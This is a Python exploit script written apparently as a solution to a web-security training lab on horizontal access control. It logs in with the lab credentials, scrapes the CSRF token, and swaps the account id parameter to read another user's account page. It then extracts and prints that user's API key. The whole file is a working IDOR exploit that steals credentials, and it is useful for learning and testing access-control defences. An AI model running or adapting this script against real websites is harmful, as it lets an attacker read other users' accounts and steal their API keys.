import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def get_api_key(s, url):
    print("[+] Logging as user 'wiener'...")
    login_url = url + "/login"
    r = s.get(login_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input")['value']
    params = {
        'username' : 'wiener',
        'password' : 'peter', 
        'csrf' : csrf_token
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("[+] Logged-in successfully... changing now the user parameter...")
        carlos_myaccount_url = url + "/my-account?id=carlos"
        r = s.get(carlos_myaccount_url, verify=False, proxies=proxies)
        api_key = re.search(r"API Key is: ([A-Z,a-z,0-9]+)", r.text).group(1)
        return api_key
    else:
        return False


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()


    url = sys.argv[1].strip()
    print("[+] Lab 07: User ID controlled by request parameter")
    print("[+] Horizontal Access Control vulnerability, accessing another user account by changing a parameter in the url")
    print("[+] FROM insecure-website/myaccount?id=123 TO insecure-website/myaccount?id=456\n")

    api_key = get_api_key(s, url)
    if not api_key:
        print("[-] Oooopsie, something went wrong! Exiting the script...")
        sys.exit(-1)
    print("[+] Exploit succeded! Carlos' API key is %s" % api_key)



if __name__ == "__main__":
    main()